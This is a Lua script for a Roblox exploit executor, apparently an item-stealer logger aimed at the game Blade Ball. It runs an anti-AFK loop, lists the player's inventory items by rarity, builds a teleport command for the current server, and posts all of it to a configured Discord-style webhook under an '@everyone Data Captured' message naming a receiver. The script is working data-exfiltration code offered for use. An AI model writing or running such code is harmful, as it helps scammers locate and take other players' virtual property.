-- [[ Services ]]
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local localPlayer = Players.LocalPlayer
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

-- [[ 1. Anti-AFK Internal Loop ]]
local function StartAntiAFK()
    localPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

-- [[ 2. Server & Inventory Intelligence ]]
local function getDetailedData()
    local items = {}
    local inventoryPath = localPlayer:FindFirstChild("Data") or localPlayer:FindFirstChild("Skins")
    
    if inventoryPath then
        for _, item in pairs(inventoryPath:GetDescendants()) do
            local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
            if cfg.rarities[rarity] then
                table.insert(items, "ID: " .. item.Name .. " [" .. rarity .. "]")
            end
        end
    end

    -- Server identification logic
    local serverData = {
        ["PlaceId"] = game.PlaceId,
        ["JobId"] = game.JobId, -- The specific server instance ID
        ["JoinScript"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)"
    }

    return items, serverData
end

-- [[ 3. Data Transmission ]]
local function executeLog()
    if not request then return end
    local items, server = getDetailedData()
    
    local payload = HttpService:JSONEncode({
        ["content"] = "@everyone Data Captured for " .. localPlayer.Name,
        ["embeds"] = {{
            ["title"] = "Blade Ball Asset Report",
            ["color"] = 0xff0000,
            ["fields"] = {
                {["name"] = "Server ID (JobId)", ["value"] = "```" .. server.JobId .. "```", ["inline"] = false},
                {["name"] = "Teleport Command", ["value"] = "```lua\n" .. server.JoinScript .. "```", ["inline"] = false},
                {["name"] = "Detected Items", ["value"] = #items > 0 and table.concat(items, "\n") or "No targeted items found.", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Receiver: " .. cfg.target_user}
        }}
    })

    request({
        Url = cfg.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end

